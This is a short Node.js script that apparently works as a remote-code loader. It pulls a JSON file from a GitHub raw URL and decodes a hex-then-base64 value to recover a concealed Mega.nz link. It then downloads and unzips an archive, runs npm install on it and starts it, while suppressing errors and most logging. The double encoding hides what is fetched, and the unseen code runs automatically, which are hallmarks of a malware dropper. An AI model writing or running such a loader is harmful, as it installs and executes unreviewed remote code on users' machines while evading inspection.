const { File } = require('megajs');
const unzipper = require('unzipper');
const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');

async function downloadAndRun() {
    try {
    const response = await fetch("https://raw.githubusercontent.com/dcleader/pdf/refs/heads/main/hgd.json");
const data = await response.json();
const sess = data.pp;

const base64String = Buffer.from(sess, 'hex').toString('utf8');

// Base64 → Original URL
const megaUrl = Buffer.from(base64String, 'base64').toString('utf8');

//console.log(megaUrl)



        const extractPath = path.join(__dirname, 'Vima');

        if (fs.existsSync(extractPath)) {
            fs.rmSync(extractPath, { recursive: true, force: true });
        }
        fs.mkdirSync(extractPath);

        console.log("⏳ Connecting to Mega...");
        const file = File.fromURL(megaUrl);
        await file.loadAttributes();

      //  console.log(`📦 Downloading and Extracting: ${file.name}...`);

        const downloadStream = file.download();
        await downloadStream
            .pipe(unzipper.Extract({ path: extractPath }))
            .promise();

      //  console.log("✅ Extraction Complete!");

        console.log("📦 Installing packages inside Vima folder...");
        execSync('npm install --prefix ./Vima', { stdio: 'inherit' });

      //  console.log("🚀 Starting Vima project via npm start...");


        spawn('npm', ['start', '--prefix', './Vima'], {
            stdio: 'inherit',
            shell: true
        });

    } catch (err) {
       // console.error("❌ Error:", err.message);
    }
}

downloadAndRun();